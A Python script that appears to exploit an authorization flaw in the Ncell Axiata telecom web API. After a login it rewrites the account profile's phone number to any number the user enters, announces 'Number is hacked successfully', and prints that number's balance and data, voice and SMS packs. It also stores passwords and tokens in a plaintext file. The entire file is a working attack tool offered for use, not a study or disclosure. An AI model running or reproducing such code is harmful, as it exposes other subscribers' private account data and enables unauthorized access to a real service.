import requests
import json
import os
token="";phone2="";password1="";password2="";
host="";
import random

def c():
    return f"\u001b[{random.randint(30,37)};1m";

def getheader():
    headerweb={
"Host": "webapi.ncell.axiata.com",
"Authorization": token,
"Content-Type": "application/json;charset=UTF-8",
"Accept": "application/json, text/plain, */*"
        }

    return headerweb



def getdata():
    global phone2

    data={
        "email":"sagar@gmail.com",
        "first_name":"Sagar",
        "last_name":"thapa",
        "date_of_birth":"12/10/2000",
        "phone_number":phone2
        }
    return data

def getsend():
    url="https://webapi.ncell.axiata.com/v1/account/dashboard";
    response=requests.get(url,headers=getheader()).json();
    return response["data"]

def postsend():
    global phone2
    
    url="https://webapi.ncell.axiata.com/v1/account/update-profile";
    data=json.dumps(getdata());
    
    response=requests.post(url,data=data,headers=getheader()).json()
    
    if response["message"]=="Information updated successfully.":
        readwrite1(1);
        print(f"\n{c()}Number is hacked successfully\n")
    
    else:
        if response["message"]=="Unauthenticated.":
            print(f"\n{c()}Please login here\n")
            return 10
        print()
        print(f'{c()}{response["message"]}')
        print()
        return 12

def weblogin(mode=0):
    global token,phone2,default,password2;
    hhhh = {
"Host": "webapi.ncell.axiata.com",
"Authorization":"Bearer "+gettoken() ,
"Content-Type": "application/json;charset=UTF-8",
"Accept": "application/json, text/plain, */*"
        }
    url="https://webapi.ncell.axiata.com/v1/account/login/request"
    if mode==0:
        phone2=input("Enter the phone: ");
        if not  len(phone2)==10:
            exit();
        password1 = input("Enter the password: " );
    if mode==1:
        password1 = password2;
        
    data =json.dumps({
  "phoneNumber":phone2,
  "password": password1,
  "redirectTo": " ",
  "url":"/v1/account/login/request"
        })
    response =requests.post(url,headers=hhhh,data=data).json();
    code = response["message"];
    if code=="OK":
        token ="Bearer "+response["data"]["token"]
        if mode==0:
            default =phone2
        password2= password1
        readwrite1(1);
        print(f"\n{c()}Login successfull\n")
    else:
        print(code);
    

def gettoken():
    url ="https://www.ncell.axiata.com"+"/en/auth/login";
    header={
"Host": "webapi.ncell.axiata.com"
        }
    
    response = requests.get(url);
    return response.cookies["ncell_website"]
    # print(response.text)

def printerweb():
    
    response=getsend()
    print(f"\n{c()}phone: {phone2}")
    balance= response["balanceInfo"]["currentBalance"]
    counter=2
    print(f"\n{c()}1. Balance: {balance}\n") 
    for key in response["packInfo"]:
        types=gettype(key)
        for json in response["packInfo"][key]:
            print(f"{c()}{counter}. {json['title_en']}"  )
            if key=="voicePack":
                print(f"{c()}Remaining: {json['remaining']/60}/{json['total']/60} {types}" )
            else:
                print(f"{c()}Remaining: {json['remaining']}/{json['total']} {types}" )
            print(f"{c()}Validity:{ json['validity']}\n")
            counter+=1

def gettype(key):
    types={"dataPack":"MB","voicePack":"Min","smsPack":"SMS"}
    return types[key]



def readwrite1( mode=0):
    global token,phone2,default,password2;
    if mode==0:
        if not os.path.exists("ncellweb.json"):
            with open("ncellweb.json","w")as fp:
                fp.write('{"phone":"","token":"","default":"","password":""}');

        else:
            with open("ncellweb.json") as fp:
                data = json.loads(fp.read());
                phone2 = data["phone"]
                token =data["token"]
                default=data["default"]
                password2 = data["password"]
    elif mode==1:
        with open("ncellweb.json","w") as writef:
            data ={"phone":phone2,"token":token,"default":default,"password":password2}
            
            data1=json.dumps(data,indent=4);
            writef.write(data1)
            


def setdefault():
    global phone2,default;
    readwrite1();
    # weblogin(1)
    temp = phone2 
    phone2 = default
    postsend();
    phone2 = temp

# weblogin() #login with password manually
readwrite1(); #entry point here
def webaxiata():
    while True:
    
        aa=input(f"{c()}1. Login\n{c()}2. AutoLogin\n{c()}3. Set Default\n{c()}4. Print\n{c()}=>");
        if aa=="b":
            break;
        elif aa=="e":
            exit();
        elif aa=="4":printerweb();
        elif int(aa)==1:
            weblogin();
        elif int(aa)==2:weblogin(1);
        elif int(aa)==3:setdefault();
        elif len(aa)==10:
            phone2=aa;
            res=postsend()
            if not res ==12 and not res==10:printerweb()
            if res==10:weblogin()
        input(f"{c()}Press enter to show menu: ")
        
            
